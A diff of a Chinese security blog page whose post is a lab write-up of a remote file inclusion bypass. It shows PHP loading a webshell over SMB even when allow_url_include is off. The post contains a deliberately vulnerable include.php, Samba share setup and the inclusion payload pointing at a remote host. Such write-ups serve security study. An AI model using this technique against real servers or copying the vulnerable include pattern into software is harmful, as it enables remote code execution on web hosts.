@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Sh@d0w&#39;s blog</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="Sh@d0w&#39;s blog">
+  <title>RFI 绕过 getshell | Sh@d0w&#39;s blog</title>
+  <meta name="keywords" content=" 文件包含 , GetShell ">
+  <meta name="description" content="RFI 绕过 getshell | Sh@d0w&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Sublime Text 3安装之后右键没有快捷打开方式，网上查找教程后修改注册表，过程如下： 1.win+R打开cmd窗口，输入regedit,打开注册表 2.找到HKEY_CLASSESS_ROOT-&gt;*-&gt;Shell，下面新建项，命名为Edit with Sublime Text3 3.在“Edit with Sublime Text”下新建字符串值，命名为Icon，值为 D:\">
 <meta property="og:type" content="article">
@@ -54,7 +54,7 @@
 </div>
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/" class="avatar_target">
     <img class="avatar" src="/img/avatar.jpg" />
@@ -445,12 +445,70 @@
         </div>
     </div>
 </aside>
-<div class="post index">
+<div class="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-RFI-绕过-getshell" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sh-d0w’s-blog"><span class="toc-text">Sh@d0w’s blog</span></a></li></ol>
+        <h1 class="article-title">RFI 绕过 getshell</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="安全杂项">安全杂项</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color5">文件包含</a>
+            
+            <a class="color4">GetShell</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-05-03 10:03:20'>2020-05-03 09:38</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:295</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                评论:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        
     
 <style>
     .left-col .switch-btn,
@@ -463,12 +521,65 @@
     }
 </style>
 </div>
-            <h2 id="Sh-d0w’s-blog"><a href="#Sh-d0w’s-blog" class="headerlink" title="Sh@d0w’s blog"></a>Sh@d0w’s blog</h2><p>到目前为止已经写了<code class="article_number"></code>篇文章， 共<code class="site_word_count"></code>字。</p>
-<p>本站访问人数：<code class="site_uv"></code>人次 ， 访问量：<code class="site_pv"></code>次</p>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>在Seebug看到<a href="https://paper.seebug.org/923/" target="_blank" rel="noopener">RFI 绕过 URL 包含限制 getshell</a>这篇文章，本地调试学习记录一波。</p>
+<p>主要描述php在配置如下时，如何使用SMB协议在局域网内突破远程文件包含getshell。</p>
+<pre><code>allow_url_fopen=off
+allow_url_include=off</code></pre><p>通过上述配置，PHP不加载远程HTTP或FTP URL，进而防止远程文件包含攻击。但即使<code>allow_url_include</code>和<code>allow_url_fopen</code>都设置为off，PHP也不会阻止SMB URL加载。</p>
+<p>本地进行简单的测试</p>
+<p>include.php</p>
+<pre><code class="php">&lt;?php
+$file=$_GET[&#39;file&#39;];
+include($file);
+?&gt;</code></pre>
+<p>在远程服务器上安装SAMBA服务器：</p>
+<pre><code>apt-get install samba</code></pre><p>创建SMB共享目录：</p>
+<pre><code>mkdir /var/www/html/pub/ </code></pre><p>配置新创建的SMB共享目录的权限：</p>
+<pre><code>chmod 0555 /var/www/html/pub/
+chown -R nobody:nogroup /var/www/html/pub/</code></pre><p>修改SAMBA服务器配置文件（/etc/samba/smb.conf）内容如下：</p>
+<pre><code>[global]
+workgroup = WORKGROUP
+server string = Samba Server %v
+netbios name = indishell-lab
+security = user
+map to guest = bad user
+name resolve order = bcast host
+dns proxy = no
+bind interfaces only = yes
 
-        </article>
-        
-        
+[ethan]
+path = /var/www/html/pub
+writable = no
+guest ok = yes
+guest only = yes
+read only = yes
+directory mode = 0555
+force user = nobody</code></pre><p>重新启动SAMBA服务器</p>
+<pre><code>service smbd restart</code></pre><p>同时在/var/www/html/pub/文件夹中放置webshell<br>通过访问<code>file=\\192.168.6.131\ethan\ant.php</code>成功包含远程shell<br><img src="/2020/05/03/RFI-%E7%BB%95%E8%BF%87-getshell/image-20200503094833670.png" alt><br><img src="/2020/05/03/RFI-%E7%BB%95%E8%BF%87-getshell/image-20200503094807579.png" alt></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>RFI 绕过 getshell</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">295</span></p>
+    <p><span class="copy-title">本文作者:</span><a  title="Sh@d0w">Sh@d0w</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-05-03, 09:38:38</p>
+    <p><span class="copy-title">最后更新:</span>2020-05-03, 10:03:20</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/05/03/RFI-%E7%BB%95%E8%BF%87-getshell/" title="RFI 绕过 getshell">https://shadow-zz.github.io/2020/05/03/RFI-%E7%BB%95%E8%BF%87-getshell/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
     <div id="comments"></div>
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
 
@@ -488,6 +599,13 @@
         gitalk.render('comments')
     })
 </script>
+
+
+
+
+    
+
+
 
 
     </div>
